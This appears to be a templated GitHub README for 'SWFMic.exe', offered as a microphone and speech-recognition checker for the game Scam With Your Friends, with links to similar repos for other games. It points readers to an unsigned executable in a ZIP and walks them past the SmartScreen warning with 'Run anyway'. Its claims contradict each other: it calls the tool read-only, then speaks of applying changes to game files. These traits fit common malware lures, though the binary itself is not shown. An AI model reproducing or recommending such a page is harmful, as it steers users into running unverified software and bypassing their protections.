# Scam With Your Friends Microphone Not Working — Speech Recognition Check

<p align="center">
  <img src="https://i.postimg.cc/05n761mP/banner.png" alt="Scam With Your Friends — Mic Check for Windows PC" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Mic%20%26%20Speech%20Check-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-swf--mic--r08-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

**Windows PC · Scam With Your Friends · Microphone and audio troubleshooting**

There are two different failures that players describe as **Scam With Your Friends mic not working**. One is straightforward: the game receives no microphone input. The other is more confusing: Windows and teammates hear the microphone, but the game's AI call does not turn the speech into text.

Those faults need different checks. The October and November updates changed microphone sensitivity, automatic leveling, local speech engines and optional cloud recognition. This page separates device setup from speech-to-text behavior, so you do not keep reinstalling audio drivers for a recognition problem.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| In-game mic meter stays completely silent | Wrong Windows default recording device or Privacy mic permission blocked | Check Windows Sound Input & Privacy → Microphone desktop permissions |
| Windows hears mic, but AI caller doesn't react | In-game speech-to-text engine or language mismatch (Nov 9 patch) | Check **Settings → Speech** engine (`Whisper Base` / CPU / Cloud) |
| Game stalls or uses high RAM on voice calls | Heavy local speech model running on limited system RAM | Switch to `Whisper Base` or supported CPU mode in Speech settings |
| Cloud speech recognition fails to transcribe | Temporary network/service outage or disabled cloud consent | Switch to local recognition mode or in-game text input |

## Download for Windows

[**Download SWFMic.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/SWFMic.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `SWFMic.exe`? (Automatic checks in ~2 seconds)

- Enumerates all active Windows audio capture (`AudioEndpoint`) devices and identifies the default mic.
- Checks Windows desktop-app microphone privacy consent flags in the user registry.
- Reports available system RAM to help choose between local Whisper models and CPU mode.
- Performs read-only checks without recording audio or modifying Windows drivers.

### Sample Diagnostic Output

```text
[SWFMic] Checking Windows microphone endpoints & speech readiness...
[OK]   Default Mic      : Headset Microphone (HyperX Cloud III) [Status: OK]
[WARN] Secondary Input  : Hands-Free AG Audio (Disabled - prevents quality drop)
[OK]   Mic Privacy      : Desktop app microphone access = Allow
[OK]   System RAM       : 16.0 GB (Sufficient for local Whisper Base speech engine)
```

The link downloads the ZIP file attached to the latest GitHub Release, rather than opening the Releases page.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `SWFMic.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Install and run

1. Download **SWFMic.zip** using the link above.
2. Right-click the downloaded archive and choose **Extract All**.
3. Open the extracted folder and start **SWFMic.exe**.
4. Review the program’s options before applying changes to game files, saves, or Windows settings.
5. Launch the game again and check whether the original problem remains.

Close the game before working with its save files. If Windows displays a security warning, check the file and its publisher instead of disabling protection.

## When this guide applies

- The in-game microphone meter stays silent despite a working headset.
- The caller does not react even though voice audio appears to be captured.
- Recognition works with one engine or language but fails with another.
- The game stalls while loading a local voice model or uses too much memory.

## Before changing anything

Close any application that may have taken exclusive control of your microphone. In **Windows Settings → System → Sound → Input**, check that the intended device is selected and its input meter reacts. Next, check **Privacy & security → Microphone** and allow microphone access for desktop applications as appropriate.

Inside the game, visit **Settings → Speech** and verify the chosen recognition engine and language. Changes to speech engines can alter how a call is processed; a working input meter does not guarantee a successful transcription.

## What to check

Test the device separately from the recognition service. If Windows cannot hear you, resolve the Windows input issue first. If Windows hears you but the call does not transcribe, try an available in-game recognition mode and review language support. The November 9 patch describes options such as Whisper Base for lower-resource machines, CPU processing, and optional cloud recognition for supported sessions.

Cloud recognition can send call audio to an external provider. Read the game's consent and settings descriptions before selecting it. Network-side AI or service outages cannot be repaired by a local microphone checker.

## What this project covers

This project is about **Scam With Your Friends speech recognition not working**, missing input, and audio-device selection. It is not a tool for recording other players without consent, modifying the game's AI services or bypassing account and connectivity requirements.

## Troubleshooting

### Windows hears the mic, but the game does not

Check in-game speech engine, language, microphone permission and current patch before reinstalling anything.

### Recognition stops after a few calls

Note the chosen local or cloud mode, available RAM and the exact moment it fails. A resource issue may resemble lost input.

### Cloud transcription is unavailable

Use an officially supported local setting or the game’s text input. Do not enter third-party credentials into unofficial utilities.

## Frequently asked questions

**Does the tool need administrator rights?**

Ordinary audio checks should not require elevation. Do not grant administrator access unless a documented feature needs it.

**Will this fix every AI caller issue?**

No. Local input, speech recognition, and remote AI calls are separate parts of the system.

**What changed in recent patches?**

Recent Steam announcements describe microphone processing and recognition controls; check your installed version first.

## Sources and game updates

These links are useful for checking whether a symptom is still present on the latest patch.
- [Steam announcement: Cloud Speech Recognition and Fixes (9 November)](https://steamdb.info/patchnotes/26529552/)
- [Scam With Your Friends updates](https://steamcommunity.com/app/4954910/allnews/)
- [Steam store page](https://store.steampowered.com/app/4954910/)

## More Windows Game Diagnostic Tools

- [WWHT-VoiceCheck](../WWHT-VoiceCheck) — We Were Here Tomorrow microphone & Vivox walkie-talkie check
- [Helldivers2-ShaderCacheGuard](../Helldivers2-ShaderCacheGuard) — HELLDIVERS 2 `shader_cache` & audio/controller check
- [ReadyOrNot-ModPakCleaner](../ReadyOrNot-ModPakCleaner) — Ready or Not co-op PAK & UE5 startup diagnostics
- [Subnautica2-CoopSaveSentinel](../Subnautica2-CoopSaveSentinel) — Subnautica 2 co-op save & mod diagnostics

## Disclaimer

This is an independent community project for Scam With Your Friends players and is not an official release from the game developer or publisher. A missing save, server outage or internal game bug may not be repairable by third-party software.
 
 
 
 
 
 
 
